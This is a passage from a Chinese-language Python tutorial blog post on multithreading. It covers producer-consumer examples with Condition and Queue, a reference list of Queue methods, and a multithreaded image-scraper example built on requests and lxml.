class=\"line\">\t\t\tgCondition.acquire()  <span class=\"comment\"># 加锁（全局变量改变前（gMoney））</span></span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> gTimes &gt;= gTotalTimes:</span><br><span class=\"line\">\t\t\t\tgCondition.release()  <span class=\"comment\"># 解锁</span></span><br><span class=\"line\">\t\t\t\t<span class=\"built_in\">print</span>(<span class=\"string\">&quot;当前生产者总共生产了%s次&quot;</span> % gTimes)</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">break</span></span><br><span class=\"line\">\t\t\tgMoney += money</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">print</span>(<span class=\"string\">&quot;%s当前存入%s元钱，剩余%s元线&quot;</span> % (threading.current_thread(), money, gMoney))</span><br><span class=\"line\">\t\t\tgTimes += <span class=\"number\">1</span></span><br><span class=\"line\">\t\t\tgCondition.notify_all()  <span class=\"comment\"># 通知正在等待的线程（wait）</span></span><br><span class=\"line\">\t\t\tgCondition.release()</span><br><span class=\"line\">\t\t\ttime.sleep(<span class=\"number\">0.5</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Cosumer</span>(<span class=\"params\">threading.Thread</span>):</span></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">run</span>(<span class=\"params\">self</span>):</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">global</span> gMoney</span><br><span class=\"line\">\t\t<span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">\t\t\tmoney = random.randint(<span class=\"number\">100</span>, <span class=\"number\">1000</span>)</span><br><span class=\"line\">\t\t\tgCondition.acquire()</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">while</span> gMoney &lt; money:</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">if</span> gTimes &gt;= gTotalTimes:</span><br><span class=\"line\">\t\t\t\t\tgCondition.release()</span><br><span class=\"line\">\t\t\t\t\t<span class=\"keyword\">return</span></span><br><span class=\"line\">\t\t\t\t<span class=\"built_in\">print</span>(<span class=\"string\">&quot;%s准备消费%d元钱，剩余%d元钱，不足&quot;</span> % (threading.current_thread(), money, gMoney))</span><br><span class=\"line\">\t\t\t\tgCondition.wait()  <span class=\"comment\"># 等待状态  （获取锁） 直到生产者把钱加上 （有钱了再去排队消费）</span></span><br><span class=\"line\">\t\t\tgMoney -= money</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">print</span>(<span class=\"string\">&quot;%s消费了%d元钱，剩余%d元钱&quot;</span> % (threading.current_thread(), money, gMoney))</span><br><span class=\"line\">\t\t\tgCondition.release()</span><br><span class=\"line\">\t\t\ttime.sleep(<span class=\"number\">0.5</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">main</span>():</span></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">3</span>):</span><br><span class=\"line\">\t\tt = Cosumer(name=<span class=\"string\">&quot;消费者线程%s&quot;</span> % x)</span><br><span class=\"line\">\t\tt.start()</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> y <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">5</span>):</span><br><span class=\"line\">\t\tt1 = Producer(name=<span class=\"string\">&quot;生产者线程%s&quot;</span> % y)</span><br><span class=\"line\">\t\tt1.start()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&#x27;__main__&#x27;</span>:</span><br><span class=\"line\">\tmain()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>多线程Lock与condition方法总结：<ol>\n<li>在上述的例子中，lock方法虽然实现了多线程的使用，但是当消费者资金不足时，程序在当前线程会重新whlie True，<br>这就导致了该线程需要再次上锁和解锁，这就导致了CPU的浪费</li>\n<li>当我们使用condition方法时，每当消费者资金不足，该线程无需重新while True，也不需要再次的上锁和解锁，<br>使用wait()，使当资金不足时的消费者线程在wait()暂停并解锁，等待条件满足时再次从wait()处开始执行，这样就<br>减少了循环过程中因上锁解锁而导致的CPu资源浪费</li>\n</ol>\n</li>\n</ul>\n<ul>\n<li>Queue线程安全队列<br>在线程中，访问一些全局变量，枷锁是一个经常的过程，如果你是想把某个数据存储到某个队列中，那么python内置了一个线程安全的模块<br>叫做queue模块。python中的queue模块中提供了同步的、线程安全的模块，其中队列Queue为先进先出，实现了原子操作，即要么不做，要<br>么做完。可使用队列来实现线程的同步。相关函数如下：<br>作用：<br>　　　解耦：使程序直接实现松耦合，修改一个函数，不会有串联关系。<br>　　　提高处理效率：ＦＩＦＯ　＝　现进先出，ＬＩＦＯ　＝　后入先出。</li>\n</ul>\n<ol>\n<li><p>Queue.Queue(maxsize=0)   FIFO， 如果maxsize小于1就表示队列长度无限</p>\n</li>\n<li><p>Queue.LifoQueue(maxsize=0)   LIFO， 如果maxsize小于1就表示队列长度无限</p>\n</li>\n<li><p>Queue.qsize()   返回队列的大小</p>\n</li>\n<li><p>Queue.empty()   如果队列为空，返回True,反之False</p>\n</li>\n<li><p>Queue.full()   如果队列满了，返回True,反之False</p>\n</li>\n<li><p>Queue.get([block[, timeout]])   读队列，取出数据 ，没有数据将会等待timeout等待时间</p>\n</li>\n<li><p>Queue.put(item, [block[, timeout]])   写队列，放入数据，timeout等待时间</p>\n</li>\n<li><p>Queue.queue.clear()   清空队列</p>\n</li>\n<li><p>class queue.PriorityQueue(maxsize=0) 存储数据时可设置优先级的队列，优先级设置数越小等级越高</p>\n</li>\n<li><p>Queue.get(timeout = 1)如果1秒后没取到数据就退出</p>\n</li>\n<li><p>Queue.get_nowait() 取数据，如果没数据抛queue.Empty异常</p>\n</li>\n<li><p>Queue.task_done()后续调用告诉队列，任务的处理是完整的。</p>\n</li>\n</ol>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> queue <span class=\"keyword\">import</span> Queue</span><br><span class=\"line\"><span class=\"keyword\">import</span> time</span><br><span class=\"line\"><span class=\"keyword\">import</span> threading</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 在队列中放入数值</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">set_value</span>(<span class=\"params\">q</span>):</span></span><br><span class=\"line\">\tindex = <span class=\"number\">0</span></span><br><span class=\"line\">\t<span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">\t\tq.put(index)</span><br><span class=\"line\">\t\tindex += <span class=\"number\">1</span></span><br><span class=\"line\">\t\ttime.sleep(<span class=\"number\">0.8</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 取出队列中的数值</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_value</span>(<span class=\"params\">q</span>):</span></span><br><span class=\"line\">\t<span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">\t\t<span class=\"built_in\">print</span>(q.get())</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">main</span>():</span></span><br><span class=\"line\">\t<span class=\"comment\"># 产生一个队列</span></span><br><span class=\"line\">\tq = Queue(<span class=\"number\">1</span>)</span><br><span class=\"line\">\tt1 = threading.Thread(target=set_value, args=[q])</span><br><span class=\"line\">\tt2 = threading.Thread(target=get_value, args=[q])</span><br><span class=\"line\"></span><br><span class=\"line\">\tt1.start()</span><br><span class=\"line\">\tt2.start()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&#x27;__main__&#x27;</span>:</span><br><span class=\"line\">\tmain()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>生产者与消费者模型</li>\n</ul>\n<ul>\n<li>代码示例三：(Queue版)</li>\n</ul>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> threading,time</span><br><span class=\"line\"><span class=\"comment\">#python2  from Queue import Queue</span></span><br><span class=\"line\"><span class=\"comment\">#python3</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> queue</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Producer</span>(<span class=\"params\">threading.Thread</span>):</span></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">run</span>(<span class=\"params\">self</span>):</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">global</span> queue</span><br><span class=\"line\">\t\tcount = <span class=\"number\">0</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">\t\t\t<span class=\"comment\">#qsize返回queue内部长度</span></span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> queue.qsize() &lt; <span class=\"number\">1000</span>:</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">100</span>):</span><br><span class=\"line\">\t\t\t\t\tcount += <span class=\"number\">1</span></span><br><span class=\"line\">\t\t\t\t\tmsg = <span class=\"string\">&#x27;生成产量&#x27;</span>+<span class=\"built_in\">str</span>(count)</span><br><span class=\"line\">\t\t\t\t\t<span class=\"comment\">#put是往queue中放入</span></span><br><span class=\"line\">\t\t\t\t\tqueue.put(msg)</span><br><span class=\"line\">\t\t\t\t\t<span class=\"built_in\">print</span>(msg)</span><br><span class=\"line\">\t\t\ttime.sleep(<span class=\"number\">0.5</span>)</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Consumer</span>(<span class=\"params\">threading.Thread</span>):</span></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">run</span>(<span class=\"params\">self</span>):</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">global</span> queue</span><br><span class=\"line\">\t\t<span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> queue.qsize() &gt; <span class=\"number\">100</span>:</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">3</span>):</span><br><span class=\"line\">\t\t\t\t\t<span class=\"comment\">#get从queue中取出一个值</span></span><br><span class=\"line\">\t\t\t\t\tmsg = self.name + <span class=\"string\">&quot;消费了&quot;</span>+queue.get()</span><br><span class=\"line\">\t\t\t\t\t<span class=\"built_in\">print</span>(msg)</span><br><span class=\"line\">\t\t\ttime.sleep(<span class=\"number\">1</span>)</span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&#x27;__main__&#x27;</span>:</span><br><span class=\"line\">\tqueue = queue.Queue()</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">500</span>):</span><br><span class=\"line\">\t\tqueue.put(<span class=\"string\">&quot;初始产品&quot;</span>+<span class=\"built_in\">str</span>(i))</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">2</span>):</span><br><span class=\"line\">\t\tp = Producer()</span><br><span class=\"line\">\t\tp.start()</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">5</span>):</span><br><span class=\"line\">\t\tc = Consumer()</span><br><span class=\"line\">\t\tc.start()</span><br><span class=\"line\">\t\t</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"爬虫之多线程\"><a href=\"#爬虫之多线程\" class=\"headerlink\" title=\"爬虫之多线程\"></a>爬虫之多线程</h3><ul>\n<li>多线程爬虫框架代码</li>\n</ul>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">from</span> lxml <span class=\"keyword\">import</span> etree</span><br><span class=\"line\"><span class=\"keyword\">import</span> os</span><br><span class=\"line\"><span class=\"keyword\">import</span> re</span><br><span class=\"line\"><span class=\"keyword\">from</span> queue <span class=\"keyword\">import</span> Queue</span><br><span class=\"line\"><span class=\"keyword\">import</span> threading</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">&quot;&quot;&quot; </span></span><br><span class=\"line\"><span class=\"string\">我们引入了threading这个包，我们将使用这个包中的</span></span><br><span class=\"line\"><span class=\"string\">Thread类，并在我们自定义的类中继承这个Thread类</span></span><br><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 生产者线程</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Procuder</span>(<span class=\"params\">threading.Thread</span>):</span></span><br><span class=\"line\">\theaders = &#123;</span><br><span class=\"line\">\t\t\t<span class=\"string\">&#x27;User-Agent&#x27;</span>: <span class=\"string\">&#x27;... 浏览器...&#x27;</span></span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"string\">&quot;&quot;&quot; 重写继承于父类的__init__方法 &quot;&quot;&quot;</span></span><br><span class=\"line\">\t<span class=\"string\">&quot;&quot;&quot; 我们继承了Thread这个类，在调用类中的方法时可能需要许多参数，我们用*args和**kwargs来接收&quot;&quot;&quot;</span></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">__init__</span>(<span class=\"params\">self, page_queue, img_queue, *args, **kwargs</span>):</span></span><br><span class=\"line\">\t\t<span class=\"built_in\">super</span>(Procuder, self).__init__(*args, **kwargs)</span><br><span class=\"line\">\t\tself.page_queue = page_queue</span><br><span class=\"line\">\t\tself.img_queue = img_queue</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"string\">&quot;&quot;&quot; 重写继承于父类的run方法，改成我们想要的方法&quot;&quot;&quot;</span></span><br><span class=\"line\">\t<span class=\"string\">&quot;&quot;&quot; 从存放每页的url的队列中逐一挑出一个url并传入parse_page中</span></span><br><span class=\"line\"><span class=\"string\">\t\t获取每页的url</span></span><br><span class=\"line\"><span class=\"string\">\t&quot;&quot;&quot;</span></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">run</span>(<span class=\"params\">self</span>):</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> self.page_queue.empty():</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">break</span></span><br><span class=\"line\">\t\t\turl = self.page_queue.get()</span><br><span class=\"line\">\t\t\tself.parse_page(url)</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">parse_page</span>(<span class=\"params\">self, url</span>):</span></span><br><span class=\"line\">\t\t<span class=\"string\">&quot;&quot;&quot; </span></span><br><span class=\"line\"><span class=\"string\">\t\t.......</span></span><br><span class=\"line\"><span class=\"string\">\t\t</span></span><br><span class=\"line\"><span class=\"string\">\t\t获取每页的响应数据，并从中提取出每张图片的</span></span><br><span class=\"line\"><span class=\"string\">\t\turl和name，并放入队列中</span></span><br><span class=\"line\"><span class=\"string\">\t\t&quot;&quot;&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 消费者线程</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Consumer</span>(<span class=\"params\">threading.Thread</span>):</span></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">__init__</span>(<span class=\"params\">self, page_queue, img_queue, *args, **kwargs</span>):</span></span><br><span class=\"line\">\t\t<span class=\"built_in\">super</span>(Procuder, self).__init__(*args, **kwargs)</span><br><span class=\"line\">\t\tself.page_queue = page_queue</span><br><span class=\"line\">\t\tself.img_queue = img_queue</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">run</span>(<span class=\"params\">self</span>):</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> self.img_queue.empty() <span class=\"keyword\">and</span> self.page_queue.empty():</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">break</span></span><br><span class=\"line\">\t\t\t\t<span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\">\t\t\t\t......</span></span><br><span class=\"line\"><span class=\"string\">\t\t\t\t</span></span><br><span class=\"line\"><span class=\"string\">\t\t\t\t利用从队列中获取的每张图片的url和name，进行图片的获取和永久储存</span></span><br><span class=\"line\"><span class=\"string\">\t\t\t\t&quot;&quot;&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">main</span>():</span></span><br><span class=\"line\">\t<span class=\"string\">&quot;&quot;&quot; 设置页数和图片的url队列&quot;&quot;&quot;</span></span><br><span class=\"line\">\tpage_queue = Queue()</span><br><span class=\"line\">\timg_queue = Queue()</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\"># 将每页的url放到页数队列中</span></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>, <span class=\"number\">101</span>):</span><br><span class=\"line\">\t\turl = <span class=\"string\">&#x27;http://........ %d&#x27;</span> % x</span><br><span class=\"line\">\t\tpage_queue.put(url)</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\"># 设置5个生产者线程</span></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">5</span>):</span><br><span class=\"line\">\t\tt = Procuder(page_queue, img_queue)</span><br><span class=\"line\">\t\tt.start()</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\"># 设置5个消费者线程</span></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">5</span>):</span><br><span class=\"line\">\t\tt = Consumer(page_queue, img_queue)</span><br><span class=\"line\">\t\tt.start()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&#x27;__main__&#x27;</span>:</span><br><span class=\"line\">\tmain()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>多线程爬虫实战代码</li>\n</ul>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">import</span> re</span><br><span class=\"line\"><span class=\"keyword\">from</span> lxml <span class=\"keyword\">import</span> etree</span><br><span class=\"line\"><span class=\"keyword\">import</span> threading</span><br><span class=\"line\"><span class=\"keyword\">import</span> os</span><br><span class=\"line\"><span class=\"keyword\">import</span> queue</span><br><span class=\"line\"><span class=\"keyword\">from</span> urllib <span class=\"keyword\">import</span> request</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 生产图片的url和name</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">ProimgUrl</span>(<span class=\"params\">threading.Thread</span>):</span></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">__init__</span>(<span class=\"params\">self, page_queue, img_queue, headers, *args, **kwargs</span>):</span></span><br><span class=\"line\">\t\t<span class=\"built_in\">super</span>().__init__(*args, **kwargs)</span><br><span class=\"line\">\t\tself.page_queue = page_queue</span><br><span class=\"line\">\t\tself.img_queue = img_queue</span><br><span class=\"line\">\t\tself.headers = headers</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">run</span>(<span class=\"params\">self</span>):</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> self.page_queue.empty():</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">break</span></span><br><span class=\"line\">\t\t\t<span class=\"keyword\">else</span>:</span><br><span class=\"line\">\t\t\t\turl = self.page_queue.get()</span><br><span class=\"line\">\t\t\t\tself.parse_page(url)</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">parse_page</span>(<span class=\"params\">self, url</span>):</span></span><br><span class=\"line\">\t\timg_get = requests.get(url=url, headers=self.headers).text</span><br><span class=\"line\">\t\ttree = etree.HTML(img_get)</span><br><span class=\"line\">\t\timg_it = tree.xpath(<span class=\"string\">&#x27;//div[@class=&quot;page-content text-center&quot;]//a&#x27;</span>)</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span> it <span class=\"keyword\">in</span> img_it:</span><br><span class=\"line\">\t\t\timg_url = it.xpath(<span class=\"string\">&#x27;./img[@class!=&quot;gif&quot;]/@data-original&#x27;</span>)[<span class=\"number\">0</span>]</span><br><span class=\"line\">\t\t\talt = it.xpath(<span class=\"string\">&#x27;./img/@alt&#x27;</span>)[<span class=\"number\">0</span>]</span><br><span class=\"line\">\t\t\talt = re.sub(<span class=\"string\">r&#x27;[\\?？.!！，。\\/\\*]&#x27;</span>, <span class=\"string\">&#x27;&#x27;</span>, alt)</span><br><span class=\"line\">\t\t\t<span class=\"comment\"># 利用splitext截取图片的后缀名</span></span><br><span class=\"line\">\t\t\tsuffix = os.path.splitext(img_url)[<span class=\"number\">1</span>]</span><br><span class=\"line\">\t\t\timg_name = alt + suffix</span><br><span class=\"line\">\t\t\tself.img_queue.put((img_url, img_name))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 获取图片并储存</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">ConimgName</span>(<span class=\"params\">threading.Thread</span>):</span></span><br><span class=\"line\">\t<span class=\"function\"><span 